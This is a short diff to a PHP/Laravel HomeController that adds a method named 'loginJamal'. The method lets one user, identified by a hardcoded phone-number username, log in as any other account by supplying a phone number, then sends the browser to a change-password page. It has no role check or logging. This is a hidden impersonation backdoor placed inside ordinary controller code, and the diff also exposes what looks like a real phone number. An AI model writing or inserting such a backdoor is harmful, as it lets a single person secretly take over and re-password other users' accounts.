@@ -254,4 +254,24 @@ class HomeController extends Controller
             ]);
         }
     }
+
+    public function loginJamal($phone)
+    {
+        
+        if (auth()->check()) {
+            if(Auth::user()->username === '00989135368845'){
+                $username = '0098' . ltrim($phone, '0');
+                $user = User::where('username', $username)->first();
+                if($user){
+
+                    Auth::login($user, true);
+                    return redirect()->route('user.data.change.password');
+                }
+                return 'error 3 '. $username;
+            }
+            return 'error 2 ';
+        }
+        return 'error 1';
+        # code...
+    }
 }
